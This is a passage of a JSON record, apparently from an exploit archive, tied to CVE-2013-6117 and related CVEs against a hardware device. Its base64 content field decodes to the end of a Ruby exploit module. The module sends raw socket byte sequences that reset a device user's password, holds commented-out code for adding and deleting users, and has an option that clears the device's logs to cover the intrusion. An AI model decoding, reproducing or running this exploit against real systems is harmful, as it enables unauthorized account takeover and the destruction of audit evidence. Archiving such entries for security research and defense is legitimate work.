QkJZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQkJc29jay5wdXQodTMpDQoJCQkJZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQkJc29jay5wdXQodTEpDQoJCQkJaWYgZGF0YSA9IHNvY2suZ2V0KDEwMjQpDQoJCQkJCXByaW50X2dvb2QoIlBBU1NXT1JEIFJFU0VUITogdXNlciAje2RhdGFzdG9yZVsnVVNFUk5BTUUnXX0ncyBwYXNzd29yZCByZXNldCB0byAje2RhdGFzdG9yZVsnUEFTU1dPUkQnXX0hIEAgI3tyaG9zdH06I3tycG9ydH0hIikNCgkJCQllbmQNCiMgCQkJZWxzaWYgKGRhdGFzdG9yZVsnQUNUSU9OJ10gPT0gIkRFTEVURSIpDQojIAkJCQl1MSA9ICJceGE0XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDhceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQojIAkJCQkgICAgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIg0KIyAJCQkJdTIgPSAiXHhhNFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDFhXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIgKw0KIyAJCQkJICAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCiMgCQkJCWRlbGV0ZSA9ICJceGE2XHgwMFx4MDBceDAwI3tkYXRhc3RvcmVbJ1VTRVJOQU1FJ10ubGVuZ3RoLmNocn1ceDAwXHgwMFx4MDBceDA3XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIgKw0KIyAJCQkJCSAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIgKw0KIyAJCQkJCSBkYXRhc3RvcmVbJ1VTRVJOQU1FJ10NCiMgCQkJCXByaW50IGRlbGV0ZQ0KIyAJCQkJc29jay5zZW5kKHUxLCAwKQ0KIyAJCQkJc29jay5nZXRfb25jZQ0KIyAJCQkJc29jay5zZW5kKGRlbGV0ZSwgMCkNCiMgCQkJCXNvY2suZ2V0X29uY2UNCiMgCQkJCXNvY2suc2VuZCh1MiwgMCkNCiMgCQkJCXNvY2suZ2V0X29uY2UNCiMgCQkJCQkgDQojIAkJCQkNCiMgCQkJZWxzaWYgKGRhdGFzdG9yZVsnQUNUSU9OJ10gPT0gIkFERCIpDQojIAkJCQl1c2Vyc3RyaW5nID0gKHVzZXJjb3VudCArIDEpLnRvX3MgKyAiOiIgKyBkYXRhc3RvcmVbJ1VTRVJOQU1FJ10gKyAiOiIgKyBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10NCiMgCQkJCXVzZXJzdHJpbmcgPDwgIlx4M2FceDMxXHgzYVx4MzFceDJjXHgzMlx4MmNceDMzXHgyY1x4MzRceDJjXHgzNVx4MmNceDM2XHgyY1x4MzciICsNCiMgCQkJCSAgICAgIlx4MmNceDM4XHgyY1x4MzlceDJjXHgzMVx4MzBceDJjXHgzMVx4MzFceDJjXHgzMlx4MzBceDJjXHgzMlx4MzEiICsNCiMgCQkJCSAgICAgIlx4MmNceDMyXHgzMlx4MmNceDMyXHgzM1x4MmNceDMyXHgzNFx4MmNceDMyXHgzNVx4MmNceDMyXHgzNlx4MmMiICsNCiMgCQkJCSAgICAgIlx4MzJceDM3XHgyY1x4MzJceDM4XHgyY1x4MzNceDM3XHgyY1x4MzNceDM4XHgyY1x4MzNceDM5XHgyY1x4MzQiICsNCiMgCQkJCSAgICAgIlx4MzBceDJjXHgzNFx4MzJceDJjXHgzNFx4MzNceDJjXHgzNFx4MzRceDJjXHgzNFx4MzVceDJjXHgzNFx4MzYiICsNCiMgCQkJCSAgICAgIlx4MmNceDM0XHgzN1x4MmNceDM0XHgzOFx4MmNceDM0XHgzOVx4MmNceDM1XHgzMFx4MmNceDM1XHgzMVx4MmMiICsNCiMgCQkJCSAgICAgIlx4MzVceDMyXHgyY1x4MzVceDMzXHgyY1x4MzVceDM0XHgyY1x4MzVceDM1XHgyY1x4MzVceDM2XHgyY1x4MzUiICsNCiMgCQkJCSAgICAgIlx4MzdceDJjXHgzNVx4MzhceDJjXHgzNVx4MzlceDJjXHgzNlx4MzBceDNhXHgzYVx4MzEiDQojIA0KIyAJCQkJdTIgPSAiXHhhNFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDFhXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCIgKw0KIyAJCQkJICAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCINCiMgCQkJCXUzID0gIlx4YTRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwOFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiICsNCiMgCQkJCSAgICAgIlx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDAiDQojIAkJCQl1NCA9ICJceGE2XHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQojIAkJCQkgICAgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIg0KIyAJCQkJdTUgPSAiXHhhNlx4MDBceDAwXHgwMCN7dXNlcnN0cmluZy5sZW5ndGguY2hyfVx4MDBceDAwXHgwMFx4MDZceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQojIAkJCQkgICAgICJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwIiArDQojIAkJCQkgICAgIHVzZXJzdHJpbmcNCiMgCQkJCXNvY2sucHV0KHUxKQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KHUxKQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KHUyKQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KHUzKQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KHUyKQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KHUzKQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KHU0KQ0KIyAJCQkJc29jay5nZXQoMTAyNCkNCiMgCQkJCXNvY2sucHV0KGdyb3VwcykNCiMgCQkJCXNvY2suZ2V0KDEwMjQpDQojIAkJCQlzb2NrLnB1dCh1c2VycykNCiMgCQkJCXNvY2suZ2V0KDEwMjQpDQojIAkJCQlzb2NrLnB1dCh1NSkNCiMgCQkJCXNvY2suZ2V0KDEwMjQpDQojIAkJCQlzb2NrLnB1dCh1MikNCiMgCQkJCXNvY2suZ2V0KDEwMjQpDQojIAkJCQlzb2NrLnB1dCh1MykNCiMgCQkJCXNvY2suZ2V0KDEwMjQpDQojIAkJCQlzb2NrLnB1dCh1NCkNCiMgCQkJCXNvY2sucHV0KDEwMjQpDQojIAkJCQlzb2NrLnB1dChncm91cHMpDQojIAkJCQlzb2NrLmdldCgxMDI0KQ0KIyAJCQkJc29jay5wdXQodXNlcnMpDQojIAkJCQlzb2NrLnB1dCgxMDI0KQ0KIyAJCQkJcHJpbnRfZ29vZCgiQURERUQgVVNFUiE6IHVzZXIgI3tkYXRhc3RvcmVbJ1VTRVJOQU1FJ119J3MgcGFzc3dvcmQgaXMgI3tkYXRhc3RvcmVbJ1BBU1NXT1JEJ119IikNCiMgCQkJCQ0KIyAJCQllbHNlDQoJCQllbmQNCgkJCQ0KCQkJDQoJCQlpZiAoZGF0YXN0b3JlWydDTEVBUl9MT0dTJ10pDQoJCQkJc29jay5wdXQoY2xlYXJfbG9ncykNCgkJCQlzb2NrLnB1dChjbGVhcl9sb2dzMikNCgkJCQlwcmludF9nb29kKCJMT0dTIENMRUFSRUQhIEAgI3tyaG9zdH06I3tycG9ydH0iKQ0KCQkJZW5kDQoJCQlkaXNjb25uZWN0KCkNCgkJZW5kDQogICAgICAgIGVuZA0KDQplbmQ=", 
    "filename": "platforms/hardware/webapps/29673.txt", 
    "id": "29673", 
    "cves": [
        "CVE-2013-6117", 
        "CVE-2013-3612", 
        "CVE-2013-3615", 
        "CVE-2013-3613", 
        "CVE-2013-3614"
    ]
}